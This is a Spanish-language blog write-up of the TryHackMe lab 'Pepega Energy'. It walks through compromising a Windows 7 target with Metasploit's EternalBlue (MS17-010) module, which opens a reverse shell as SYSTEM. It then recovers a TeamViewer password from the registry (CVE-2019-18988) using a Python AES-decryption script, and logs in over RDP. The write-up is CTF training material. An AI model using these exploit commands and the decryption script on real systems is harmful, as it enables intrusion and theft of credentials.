<!DOCTYPE html>
<html lang="en">
<head>
  
    <title>TryHackMe - Pepega Energy :: sckull — HackTheBox Writeups, CTF</title>    
  
  <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Expires" content="0">

<meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
<meta name="description" content="Titulo Pepega Energy     Room Pepega Energy   Info A new startup has asked for a security audit: turns out there&amp;rsquo;s only one laptop.   Puntos 1642   Dificultad Media   Maker SherlockSec    NMAP Escaneo de puertos tcp/udp, nmap nos muestra varios puertos abiertos.
# Nmap 7.80 scan initiated Tue Feb 11 18:02:35 2020 as: nmap -p- -sV -sC -T4 -o nmap_scan 10."/>
<meta name="keywords" content=""/>
<meta name="robots" content="noodp"/>
<link rel="canonical" href="https://sckull.github.io/posts/pepegaenergy/" />


<link rel="stylesheet" href="https://sckull.github.io/assets/style.css">


<link rel="stylesheet" href="https://sckull.github.io/style.css">


<link rel="shortcut icon" href="https://sckull.github.io/img/favicon.png">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
<script src="https://kit.fontawesome.com/57784fec54.js" crossorigin="anonymous"></script>


<meta name="twitter:card" content="summary" />
<meta name="twitter:title" content="TryHackMe - Pepega Energy :: sckull — HackTheBox Writeups, CTF" />
<meta name="twitter:description" content="Titulo Pepega Energy     Room Pepega Energy   Info A new startup has asked for a security audit: turns out there&amp;rsquo;s only one laptop.   Puntos 1642   Dificultad Media   Maker SherlockSec    NMAP Escaneo de puertos tcp/udp, nmap nos muestra varios puertos abiertos.
# Nmap 7.80 scan initiated Tue Feb 11 18:02:35 2020 as: nmap -p- -sV -sC -T4 -o nmap_scan 10." />
<meta name="twitter:site" content="https://sckull.github.io/" />
<meta name="twitter:creator" content="sckull" />
<meta name="twitter:image" content="https://sckull.github.io/image/tryhackme/pepegaenergy/cover.png">





<meta property="og:locale" content="en" />
<meta property="og:type" content="article" />
<meta property="og:title" content="TryHackMe - Pepega Energy :: sckull — HackTheBox Writeups, CTF">
<meta property="og:description" content="Titulo Pepega Energy     Room Pepega Energy   Info A new startup has asked for a security audit: turns out there&amp;rsquo;s only one laptop.   Puntos 1642   Dificultad Media   Maker SherlockSec    NMAP Escaneo de puertos tcp/udp, nmap nos muestra varios puertos abiertos.
# Nmap 7.80 scan initiated Tue Feb 11 18:02:35 2020 as: nmap -p- -sV -sC -T4 -o nmap_scan 10." />
<meta property="og:url" content="https://sckull.github.io/posts/pepegaenergy/" />
<meta property="og:site_name" content="TryHackMe - Pepega Energy" />
<meta property="og:image" content="https://sckull.github.io/image/tryhackme/pepegaenergy/cover.png">
<meta property="og:image:width" content="2048">
<meta property="og:image:height" content="1024">

<meta name="google-site-verification" content="cug_0s4kFi5UbEfBI5hJsscmJ7XdimqECCYfN1EAZq0" />


<script type="application/ld+json">
    {
        "@context" : "http://schema.org",
        "@type" : "BlogPosting",
        "mainEntityOfPage": {
             "@type": "WebPage",
             "@id": "https://sckull.github.io/"
        },
        "articleSection" : "posts",
        "name" : "TryHackMe - Pepega Energy",
        "headline" : "TryHackMe - Pepega Energy",
        "description" : "Titulo Pepega Energy     Room Pepega Energy   Info A new startup has asked for a security audit: turns out there&rsquo;s only one laptop.   Puntos 1642   Dificultad Media   Maker SherlockSec    NMAP Escaneo de puertos tcp/udp, nmap nos muestra varios puertos abiertos.
# Nmap 7.80 scan initiated Tue Feb 11 18:02:35 2020 as: nmap -p- -sV -sC -T4 -o nmap_scan 10.",
        "inLanguage" : "en-US",
        "author" : "",
        "creator" : "",
        "publisher": "",
        "accountablePerson" : "",
        "copyrightHolder" : "",
        "copyrightYear" : "2020",
        "datePublished": "2020-02-12 00:00:00 &#43;0000 UTC",
        "dateModified" : "2020-02-12 00:00:00 &#43;0000 UTC",
        "url" : "https://sckull.github.io/posts/pepegaenergy/",
        "wordCount" : "1540",
        "keywords" : [ "tryhackme","windows","CVE-2019-18988","Blog" ]
    }
    </script>


<meta property="article:published_time" content="2020-02-12 00:00:00 &#43;0000 UTC" />




<a name="top"></a>
</head>

<body class="dark-theme">
  
<div class="container">
  <header class="header">
  <span class="header__inner">
    <a href="/" class="logo" style="text-decoration: none;">
  
    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" width="44" height="44" viewBox="0 0 44 44">
  <polyline fill="none" stroke="#fff" stroke-width="2" points="15 8 29.729 22.382 15 35.367"/>
</svg>
</span>
    <span class="logo__text">sckull | blog</span>
    <span class="logo__cursor"></span>
  
</a>

    <span class="header__right">
      
        <nav class="menu">
  <ul class="menu__inner menu__inner--desktop">
    
    
      
        
                   

          

          

          
            <li><a href="/about">About</a></li>
          

        
      
        
                   

          
            <li><a href="/tags/hackthebox/"><img class="icon" src="/hackthebox.ico" width="32" title="HackTheBox"></a></li>
          

          

          

        
      
        
                   

          

          
            <li><a href="/tags/tryhackme/"><img class="icon" src="/thm.ico" width="32" title="TryHackMe"></a></li>
          

          

        
      
      
    
  </ul>

  <ul class="menu__inner menu__inner--mobile">
    
      
        

          

          

          
            <li><a href="/about">About</a></li>
          

      
    
      
        

          
            <li><a href="/tags/hackthebox/"><img class="icon" src="/hackthebox.ico" width="32" title="HackTheBox"></a></li>
          

          

          

      
    
      
        

          

          
            <li><a href="/tags/tryhackme/"><img class="icon" src="/thm.ico" width="32" title="TryHackMe"></a></li>
          

          

      
    
  </ul>
</nav>

        <span class="menu-trigger">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
            <path d="M0 0h24v24H0z" fill="none"/>
            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
          </svg>
        </span>
      
      
    </span>
  </span>
  <link rel="shortcut icon" href="https://sckullbock.blogspot.com/favicon.ico">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/2.5.0/Chart.min.js"></script>
</header>

  
  <div class="content">    
    

  <div class="post">
    <h2 class="post-title">TryHackMe - Pepega Energy</h2>
    <div class="post-meta">
      
        <span class="post-date">
          <i class="fas fa-calendar-week"></i>
            Wednesday, Feb 12, 2020
        </span>
      
      <span class="post-author">— Written by sckull</span>
      
        <span class="post-read-time">— 8 min read</span>
      
    </div>
        
    
      <span class="post-tags">
        
         <a class="button-tag" href="https://sckull.github.io/tags/tryhackme/"><li class="fa fa-tag"></li> tryhackme</a>&nbsp;
        
         <a class="button-tag" href="https://sckull.github.io/tags/windows/"><li class="fa fa-tag"></li> windows</a>&nbsp;
        
         <a class="button-tag" href="https://sckull.github.io/tags/cve-2019-18988/"><li class="fa fa-tag"></li> CVE-2019-18988</a>&nbsp;
        
      </span>
    

    
      
        <img src="https://sckull.github.io/posts/pepegaenergy/../../image/tryhackme/pepegaenergy/cover.png" class="post-cover center" />
      
      <hr />
     
    

    <div class="contenido">
      <h2>Contenido</h2>
      <nav id="TableOfContents">
<ul>
<li>
<ul>
<li><a href="#nmap">NMAP</a></li>
<li><a href="#metasploit">METASPLOIT</a></li>
<li><a href="#teamviewer-cve-2019-18988">TeamViewer - CVE-2019-18988</a></li>
<li><a href="#flags">FLAGS</a>
<ul>
<li><a href="#rdp-desktop">RDP - Desktop</a></li>
</ul></li>
</ul></li>
</ul>
</nav>
    </div>

    <div class="post-content">      
      

<table>
<thead>
<tr>
<th>Titulo</th>
<th>Pepega Energy</th>
</tr>
</thead>

<tbody>
<tr>
<td>Room</td>
<td>Pepega Energy</td>
</tr>

<tr>
<td>Info</td>
<td>A new startup has asked for a security audit: turns out there&rsquo;s only one laptop.</td>
</tr>

<tr>
<td>Puntos</td>
<td>1642</td>
</tr>

<tr>
<td>Dificultad</td>
<td>Media</td>
</tr>

<tr>
<td>Maker</td>
<td><a href="https://tryhackme.com/p/SherlockSec">SherlockSec</a></td>
</tr>
</tbody>
</table>

<h2 id="nmap">NMAP</h2>

<p>Escaneo de puertos tcp/udp, nmap nos muestra varios puertos abiertos.</p>

<pre><code class="language-bash"># Nmap 7.80 scan initiated Tue Feb 11 18:02:35 2020 as: nmap -p- -sV -sC -T4 -o nmap_scan 10.10.219.23
Nmap scan report for 10.10.219.23
Host is up (0.15s latency).
Not shown: 65522 closed ports
PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server?
|_ssl-date: 2020-02-12T00:24:28+00:00; 0s from scanner time.
5357/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
5938/tcp  open  teamviewer?
9001/tcp  open  tcpwrapped
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49159/tcp open  msrpc              Microsoft Windows RPC
49160/tcp open  msrpc              Microsoft Windows RPC
Service Info: Host: PEPEGAENERGY-01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_nbstat: NetBIOS name: PEPEGAENERGY-01, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 02:a3:b7:7e:bc:1e (unknown)
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: PepegaEnergy-01
|   NetBIOS computer name: PEPEGAENERGY-01\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2020-02-12T00:24:21+00:00
| smb-security-mode: 
|   account_used: &lt;blank&gt;
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-02-12T00:24:21
|_  start_date: 2020-02-12T00:02:09

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Feb 11 18:25:30 2020 -- 1 IP address (1 host up) scanned in 1375.40 seconds
</code></pre>

<p>Utilizamos nuevamente NMAP para escanear el puerto de smb (445) por posibles vulnerabilidades, vemos que es vulnerable a <code>ms17-010</code>.</p>

<pre><code class="language-bash"># Nmap 7.80 scan initiated Tue Feb 11 18:27:13 2020 as: nmap --script smb-vuln* -p 445 -o nmap_smb_vuln 10.10.219.23
Nmap scan report for 10.10.219.23
Host is up (0.25s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143

# Nmap done at Tue Feb 11 18:27:26 2020 -- 1 IP address (1 host up) scanned in 12.34 seconds
</code></pre>

<h2 id="metasploit">METASPLOIT</h2>

<p>Utilizamos metasploit para poder explotar la vulnerabilidad, primero utilizamos el modulo auxiliar para verificar que la maquina era vulnerable.</p>

<pre><code class="language-bash">msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; set rhosts 10.10.219.23
rhosts =&gt; 10.10.219.23
msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; run

[+] 10.10.219.23:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.219.23:445      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf5 auxiliary(scanner/smb/smb_ms17_010) &gt;
</code></pre>

<p>Una vez verificado, utilizamos el exploit en contra de la maquina, obteniendo una shell con usuario <code>nt authority\system</code>.</p>

<pre><code class="language-bash">msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; show options 

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&lt;path&gt;'
   RPORT          445              yes       The target port (TCP)
   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs


msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; set rhosts 10.10.219.23
rhosts =&gt; 10.10.219.23
msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; run

[*] Started reverse TCP handler on 10.8.1.72:4444 
[*] 10.10.219.23:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.219.23:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.219.23:445      - Scanned 1 of 1 hosts (100% complete)
[*] 10.10.219.23:445 - Connecting to target for exploitation.
[+] 10.10.219.23:445 - Connection established for exploitation.
[+] 10.10.219.23:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.219.23:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.219.23:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.219.23:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.219.23:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.219.23:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.219.23:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.219.23:445 - Sending all but last fragment of exploit packet
[*] 10.10.219.23:445 - Starting non-paged pool grooming
[+] 10.10.219.23:445 - Sending SMBv2 buffers
[+] 10.10.219.23:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.219.23:445 - Sending final SMBv2 buffers.
[*] 10.10.219.23:445 - Sending last fragment of exploit packet!
[*] 10.10.219.23:445 - Receiving response from exploit packet
[+] 10.10.219.23:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.219.23:445 - Sending egg to corrupted connection.
[*] 10.10.219.23:445 - Triggering free of corrupted buffer.
[*] Command shell session 1 opened (10.8.1.72:4444 -&gt; 10.10.219.23:49189) at 2020-02-11 18:35:42 -0600
[+] 10.10.219.23:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.219.23:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.219.23:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=


Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32&gt;whoami
whoami
nt authority\system

C:\Windows\system32&gt;
</code></pre>

<p>Nuestra shell no era meterpreter por lo que utilizamos el modulo de post-explotacion <strong>shell_to_meterpreter</strong>.</p>

<pre><code class="language-bash">msf5 post(multi/manage/shell_to_meterpreter) &gt; show options 

Module options (post/multi/manage/shell_to_meterpreter):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
   LHOST                     no        IP of host that will receive the connection from the payload (Will try to auto detect).
   LPORT    4433             yes       Port for payload to connect to.
   SESSION                   yes       The session to run this module on.

msf5 post(multi/manage/shell_to_meterpreter) &gt; set lhost tun0
lhost =&gt; 10.8.1.72
msf5 post(multi/manage/shell_to_meterpreter) &gt; set session 2
session =&gt; 2
msf5 post(multi/manage/shell_to_meterpreter) &gt; run

[*] Upgrading session ID: 2
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 10.8.1.72:4433 
[*] Post module execution completed
msf5 post(multi/manage/shell_to_meterpreter) &gt; sessions 

Active sessions
===============

  Id  Name  Type               Information                                                                       Connection
  --  ----  ----               -----------                                                                       ----------
  2         shell x64/windows  Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation...  10.8.1.72:4444 -&gt; 10.10.219.23:49193 (10.10.219.23)

msf5 post(multi/manage/shell_to_meterpreter) &gt; 
[*] Sending stage (180291 bytes) to 10.10.219.23
[*] Meterpreter session 3 opened (10.8.1.72:4433 -&gt; 10.10.219.23:49194) at 2020-02-11 18:48:44 -0600
[*] Stopping exploit/multi/handler

msf5 post(multi/manage/shell_to_meterpreter) &gt; sessions 

Active sessions
===============

  Id  Name  Type                     Information                                                                       Connection
  --  ----  ----                     -----------                                                                       ----------
  2         shell x64/windows        Microsoft Windows [Version 6.1.7601] Copyright (c) 2009 Microsoft Corporation...  10.8.1.72:4444 -&gt; 10.10.219.23:49193 (10.10.219.23)
  3         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ PEPEGAENERGY-01                                             10.8.1.72:4433 -&gt; 10.10.219.23:49194 (10.10.219.23)
</code></pre>

<h2 id="teamviewer-cve-2019-18988">TeamViewer - CVE-2019-18988</h2>

<p>Dentro de los procesos que se estan ejecutando en la maquina hay un proceso curioso y es TeamViewer. Buscamos vulnerabilidades recientes y vemos el <code>CVE-2019-18988</code> en el cual indica que pueden ser extraidos datos utilizando querys en claves de registro, en nuestro caso, utilizamos <code>post/windows/gather/credentials/teamviewer_passwords</code> de metasploit y logramos obtener la contraseña.</p>

<p><a href="https://whynotsecurity.com/blog/teamviewer/"><strong>TeamViewer - CVE-2019-18988</strong></a></p>

<p><strong>Post</strong>
<img src="../../image/tryhackme/pepegaenergy/Screenshot_20200211_215738.png" alt="image" /></p>

<p>Por alguna razon nuestra contraseña no se muestra completa con el modulo de metasploit, se puede hacer manualmente, haciendo un query al registro:</p>

<pre><code class="language-bash">C:\Users\Timmy\Desktop&gt;reg query HKEY_LOCAL_MACHINE\SOFTWARE\TeamViewer\Version7 /v SecurityPasswordAES
reg query HKEY_LOCAL_MACHINE\SOFTWARE\TeamViewer\Version7 /v SecurityPasswordAES

HKEY_LOCAL_MACHINE\SOFTWARE\TeamViewer\Version7
    SecurityPasswordAES    REG_BINARY    871C158E545657D6D714B[... snip ...]594917DD1847A810EFF8C13356


C:\Users\Timmy\Desktop&gt;
</code></pre>

<p>Luego con un script en python poder desencriptar la conraseña:</p>

<pre><code class="language-python">import sys, hexdump, binascii
from Crypto.Cipher import AES

class AESCipher:
    def __init__(self, key):
        self.key = key

    def decrypt(self, iv, data):
        self.cipher = AES.new(self.key, AES.MODE_CBC, iv)
        return self.cipher.decrypt(data)

key = binascii.unhexlify(&quot;0602000000a400005253413100040000&quot;)
iv = binascii.unhexlify(&quot;0100010067244F436E6762F25EA8D704&quot;)
hex_str_cipher = &quot;871C158E545657D6D714B34730465D85E4A[... snip ...]FC41AA4A18ADFE594917DD1847A810EFF8C13356&quot; #Query

ciphertext = binascii.unhexlify(hex_str_cipher)
raw_un = AESCipher(key).decrypt(iv, ciphertext)
print(hexdump.hexdump(raw_un))
password = raw_un.decode('utf-16')
print(password)
</code></pre>

<p>Contraseña:</p>

<pre><code class="language-bash">root@aoiri:~/tryhackme/pepegaenergy# python aes_teamviewer.py 
00000000: 52 00 65 00 64 00 42 00  75 00 6C 00 6C 00 45 00  R.e.d.....l.l.E.
00000010: 6E 00 65 00 72 00 67 00  79 00 42 00 61 00 64 00  [... snip ...]
00000020: 58 00 44 00 00 00 00 00  00 00 00 00 00 00 00 00  X...............
None
Re[... snip ...]D
root@aoiri:~/tryhackme/pepegaenergy#
</code></pre>

<h2 id="flags">FLAGS</h2>

<p>En la carpeta de Timmy y Zachary vemos algunos archivos con extencion rtf, los cuales podemos abrir utilizando Writer de LibreOffice y obtener la informacion que necesitamos.</p>

<pre><code class="language-bash">meterpreter &gt; ls
Listing: C:\Users\Timmy\Desktop
===============================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
100666/rw-rw-rw-  1155   fil   2020-02-04 17:15:48 -0600  RuneLite.lnk
100666/rw-rw-rw-  282    fil   2020-02-04 13:56:30 -0600  desktop.ini
100666/rw-rw-rw-  42337  fil   2020-02-04 17:14:03 -0600  home work.rtf
100666/rw-rw-rw-  43806  fil   2020-02-04 17:14:03 -0600  important.rtf
100666/rw-rw-rw-  41978  fil   2020-02-04 17:14:03 -0600  rune scape pass word.rtf
100777/rwxrwxrwx  41     fil   2020-02-04 13:59:32 -0600  script.bat

meterpreter &gt; dir
Listing: C:\Users\Zachary\Desktop\Work Documents
================================================

Mode              Size      Type  Last modified              Name
----              ----      ----  -------------              ----
100666/rw-rw-rw-  42457     fil   2020-02-04 17:12:36 -0600  Email Backup - Mockup.rtf
100666/rw-rw-rw-  12234768  fil   2020-02-04 17:12:36 -0600  Mockup 1.png
100666/rw-rw-rw-  11780324  fil   2020-02-04 17:12:36 -0600  Mockup 2.png
100666/rw-rw-rw-  680       fil   2020-02-04 15:44:41 -0600  To-Do List.rtf
</code></pre>

<h3 id="rdp-desktop">RDP - Desktop</h3>

<p>Utilizamos el servicio RDP de la maquina para obtener las flags dentro de Firefox del usuario Zachary y Timmy, para iniciar sesion en este servicio utilizamos al usuario Zachary y la contraseña que encontramos en TeamViewer:</p>

<p><strong>Zachary</strong>
<img src="../../image/tryhackme/pepegaenergy/Screenshot_20200211_215826.png" alt="image" /></p>

<p><strong>Timmy</strong>
<img src="../../image/tryhackme/pepegaenergy/Screenshot_20200211_221451.png" alt="image" /></p>

    </div>    
    <hr />
    
    <div>
      
        
<div id="disqus_thread"></div>
<script>
(function() {
var d = document, s = d.createElement('script');
s.src = 'https://sckull.disqus.com/embed.js';
s.setAttribute('data-timestamp', +new Date());
(d.head || d.body).appendChild(s);
})();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>

      
      
    </div>

    
      <div class="pagination">
        <div class="pagination__title">
          <span class="pagination__title-h">Read other posts</span>
          <hr />
        </div>
        <div class="pagination__buttons">
          
            <span class="button previous">
              <a href="https://sckull.github.io/posts/madness_thm/">
                <span class="button__icon">←</span>
                <span class="button__text">TryHackMe - Madness</span>
              </a>
            </span>
          
          
            <span class="button next">
              <a href="https://sckull.github.io/posts/c4ptur3-th3-fl4g/">
                <span class="button__text">TryHackMe - c4ptur3-th3-fl4g</span>
                <span class="button__icon">→</span>
              </a>
            </span>
          
        </div>
      </div>
      
    
    
    
  </div>
  
    
  </div>
  
  
    <footer class="footer">
  <div class="footer__inner">
    
      <a href="/" class="logo" style="text-decoration: none;">
  
    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" width="44" height="44" viewBox="0 0 44 44">
  <polyline fill="none" stroke="#fff" stroke-width="2" points="15 8 29.729 22.382 15 35.367"/>
</svg>
</span>
    <span class="logo__text">sckull | blog</span>
    <span class="logo__cursor"></span>
  
</a>

      <div class="copyright">
        <span style="font-size: 0.85em;">© 2020 sckull</span>
        
      
      </div>
    
  </div>
</footer>

<script src="https://sckull.github.io/assets/main.js"></script>
<script src="https://sckull.github.io/assets/prism.js"></script>

  
  
  
  <a class="float" id="myBtn" href="#top"><i class="fa fa-arrow-up" aria-hidden="true"></i></a>
  
</div>






</body>
</html>
